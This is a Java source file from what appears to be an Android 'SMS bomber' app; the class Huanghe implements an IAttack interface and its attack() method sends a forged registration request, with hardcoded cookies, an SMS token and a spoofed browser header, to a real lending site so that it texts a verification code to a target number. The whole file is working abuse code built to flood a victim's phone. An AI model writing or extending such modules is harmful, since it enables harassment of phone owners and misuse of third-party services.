package com.example.wudi.sms.sites;

import android.util.Log;

import com.example.wudi.sms.MainApplication;
import com.example.wudi.sms.Utils;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Created by wudi on 12/16/2015.
 */
public class Huanghe implements IAttack {
    @Override
    public void attack() {
        final MediaType text = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");

        OkHttpClient client = new OkHttpClient();
        client.setConnectTimeout(5000, TimeUnit.MILLISECONDS);
        client.setReadTimeout(5000, TimeUnit.MILLISECONDS);
        client.setWriteTimeout(5000, TimeUnit.MILLISECONDS);
        String postBody = "phone=" + Utils.getNumber(MainApplication.context) + "&getphonecode=1&sms_token=db56d59f96557d33912251532e31a842";

        Request request = new Request.Builder()
                .url("https://www.hhedai.com/?user&q=reg&type=ajax&https=false")
                .post(RequestBody.create(text, postBody))
                .addHeader("Cookie", "PHPSESSID=84icfonttrdjcs72soidpgqtu2; Hm_lvt_a33966330cd764adb07d93cf4d946002=1450260568; Hm_lpvt_a33966330cd764adb07d93cf4d946002=1450260583; Hm_lvt_05677ad74d39c595d335fc5255fb5a8c=1450260569; Hm_lpvt_05677ad74d39c595d335fc5255fb5a8c=1450260569; LXB_REFER=www.rong360.com")
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
            }

            @Override
            public void onResponse(Response response) throws IOException {
                response.body().close();
            }
        });
    }
}
